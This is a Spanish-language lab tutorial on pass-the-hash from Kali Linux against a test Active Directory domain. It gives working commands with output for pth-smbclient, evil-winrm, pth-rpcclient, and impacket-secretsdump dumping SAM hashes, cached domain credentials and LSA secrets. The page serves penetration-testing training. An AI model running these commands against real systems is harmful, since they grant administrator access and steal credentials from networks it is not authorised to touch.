---
icon: unlock
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Pass-The-Hash con Linux

Si queremos realizar lo mismo de antes, pero desde `linux` lo haremos con una herramienta que viene por defecto en `kali`, suponiendo que tenemos ya el `hash` del `administrador` o de cualquier tipo de usuario con el que queremos realizar ese `pth`, haremos lo siguiente:

```shell
pth-smbclient //192.168.5.5/c$ -U Administrator --pw-nt-hash a87f3a337d73085c45f9416be5787d86 -W corp.local
```

Info:

```
Try "help" to get a list of possible commands.
smb: \> ls
  $Recycle.Bin                      DHS        0  Sat May  8 04:20:24 2021
  Documents and Settings          DHSrn        0  Sun Jan  5 05:22:02 2025
  DumpStack.log.tmp                 AHS    12288  Tue Jan 21 03:14:12 2025
  pagefile.sys                      AHS 536870912  Tue Jan 21 03:14:12 2025
  PerfLogs                            D        0  Sat May  8 04:20:24 2021
  Program Files                      DR        0  Sun Jan  5 05:28:08 2025
  Program Files (x86)                 D        0  Sat May  8 05:39:35 2021
  ProgramData                       DHn        0  Sat Jan 11 10:12:12 2025
  Recovery                         DHSn        0  Sun Jan  5 05:22:02 2025
  Shares                              D        0  Mon Jan  6 07:06:47 2025
  System Volume Information         DHS        0  Sun Jan  5 06:12:17 2025
  Users                              DR        0  Sun Jan  5 05:28:05 2025
  Windows                             D        0  Tue Jan  7 14:12:54 2025

                15644159 blocks of size 4096. 12751911 blocks available
```

Vemos que hemos conseguido conectarnos al `DC` en el recurso compartido del `C$` como el `administrador` por lo que tendriamos acceso al `DC` desde `kali` como el usuario `Administrador` del dominio.

Esto mismo tambien lo podemos realizar mediante el protocolo `WinRM` (Protocolo de gestion remota, que suele estar activo en casi todas las infraestructuras de empresas de `Active Directory`), para ello antes activaremos este mismo protocolo en nuestra maquina `Windows` para que este activo y configurado con un comando, por lo que nos iremos a nuestro `WS01`, abriremos una `PowerShell` como `administrador` local y ejecutaremos lo siguiente:

```powershell
winrm quickconfig
```

Info:

```
WinRM no está configurado para recibir solicitudes en este equipo.
Se deben realizar estos cambios:

Inicie el servicio WinRM.
Establezca el tipo de servicio WinRM en inicio automático aplazado.

¿Desea realizar estos cambios [y/n]? y

WinRM se ha actualizado para recibir solicitudes.

Se cambió el tipo de servicio WinRM correctamente.
Servicio WinRM iniciado.
WinRM no está configurado para permitir acceso remoto al equipo para administración.
Se deben realizar estos cambios:

Habilitar la excepción de firewall WinRM.

¿Desea realizar estos cambios [y/n]? y

WinRM se actualizó para administración remota.

Excepción de firewall WinRM habilitada.
```

Y con esto ya tendriamos nuestro `WinRM` activado correctamente.

Ahora si nos vamos al `kali` y utilizamos una herramienta muy famosa llamada `evil-winrm` que no vendra por defecto en `kali`, podremos acceder de forma remota para gestionar un equipo mediante el protocolo `evil-winrm`, vamos a instalar la herramienta antes de todo.

```shell
sudo gem install evil-winrm
```

Y con esto ya tendriamos instalada la herramienta.

Vamos a probar a entrar en el equipo `WS01` de forma remota como el usuario `Administrador` de la siguiente forma:

```shell
evil-winrm -i 192.168.5.208 -u Administrator -p Passw0rd
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```

Y con esto veremos que funciona correctamente, por lo que nos podemos conectar a dicho equipo.

Pero como nosotros no tenemos la contraseña, solo tenemos el `hash` del `Administrador` podremos hacer un `pth` con `winrm` de la siguiente forma:

```shell
evil-winrm -i 192.168.5.208 -u Administrator -H a87f3a337d73085c45f9416be5787d86
```

Info:

```
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
corp\administrator
```

Y con esto veremos que con el `hash` tambien nos dejo entrar.

Con la herramienta `impacket` se puede hacer lo mismo, con el `hash` podremos autenticarnos como el `administrador` para realizar cosas como el mismo.

```shell
impacket-secretsdump Administrator@192.168.5.208 -hashes :a87f3a337d73085c45f9416be5787d86
```

Hay que indicarselo con un formato especial para la herramienta poniendo los `:` por delante del `hash`.

Info:

```
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Service RemoteRegistry is in stopped state
[*] Service RemoteRegistry is disabled, enabling it
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xc8125866b327df176940c9f2d6a48f5f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrador:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Invitado:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:5ed544e71abe56b376b7993b21946520:::
santiago:1001:aad3b435b51404eeaad3b435b51404ee:7ce21f17c0aee7fb9ceba532d0546ad6:::
[*] Dumping cached domain logon information (domain/username:hash)
CORP.LOCAL/empleado1:$DCC2$10240#empleado1#fda53d6158406f827388476bcbc97c37: (2025-01-20 09:22:18)
CORP.LOCAL/Administrator:$DCC2$10240#Administrator#e1c8d7e26653ae629a74772a389cf7e6: (2025-01-20 09:23:12)
CORP.LOCAL/annice.mable:$DCC2$10240#annice.mable#77702054bffe13f7c5bbe919a228d985: (2025-01-12 11:36:13)
CORP.LOCAL/angelika.shelly:$DCC2$10240#angelika.shelly#835512d4e4bb1d962c57d290eb99f670: (2025-01-12 16:51:40)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CORP\WS01$:aes256-cts-hmac-sha1-96:9a9fc7447f8fa5521eeef5af175be7af2189392bc0d56f2e7d41e4c15cdad294
CORP\WS01$:aes128-cts-hmac-sha1-96:73670fc7a88720c24ff4c869dc84a9c1
CORP\WS01$:des-cbc-md5:8c5bea107cc8c804
CORP\WS01$:plain_password_hex:5700320055006b0049004e0027003d005e0055005c00750052004c0077006e004e00510045003c002d0066005d004b005f007600330072004400350022002700750068004e00300041003d0024006c004e0022005700750065006b00640034004a0056006f003e006c005f006c0050005c005d002700360077002c00290033005e005d004f005e005100560027002e003200380029004f0078005100410049002c003a0025005f00680072005d00380034002500490068002200640045006f0072005c0063002d0022005f002f006f0065006700720022005f0061006c00780047006400590062007700770059005f00
CORP\WS01$:aad3b435b51404eeaad3b435b51404ee:afc5c02d936d73808ce716070e883ab8:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x6be6aee6bc489e7fab1ed9a63b1aa5c0d2f13fef
dpapi_userkey:0xb83f8122ee552579d8fbf4d9b304ae19ab5bb7af
[*] NL$KM 
 0000   5C B5 3B 8C D5 28 A0 C3  6A F2 57 A3 08 B6 F7 D4   \.;..(..j.W.....
 0010   E4 7D 11 84 8F 2C 98 2B  2D DD 06 7D 30 53 B4 23   .}...,.+-..}0S.#
 0020   4B 8D C7 7E 92 96 5B 48  67 29 99 50 C1 E4 27 A6   K..~..[Hg).P..'.
 0030   37 2C 9D 99 E8 FD 57 11  CC 44 47 ED 30 6F 96 00   7,....W..DG.0o..
NL$KM:5cb53b8cd528a0c36af257a308b6f7d4e47d11848f2c982b2ddd067d3053b4234b8dc77e92965b4867299950c1e427a6372c9d99e8fd5711cc4447ed306f9600
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[*] Restoring the disabled state for service RemoteRegistry
```

Y vemos que nos vuelva bien la `SAM` como el usuario `Administrador`.

Mediante el `rpcclient` tambien podremos realizar este `pth` de la siguiente forma:

```shell
pth-rpcclient -U corp/administrator%00000000000000000000000000000000:a87f3a337d73085c45f9416be5787d86 //192.168.5.208
```

En este caso como tiene que tener un formato en concreto el `hash` pero el nuestro es un `hash` simple tendremos que rellenarlo con `32` ceros por delante y despues de los `:` poner el `hash` del `administrador`.

Info:

```
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
rpcclient $>
```

Y aqui podremos ver que hemos accedido de forma correcta mediante el protocolo `rpcclient` haciendo un `pth`.
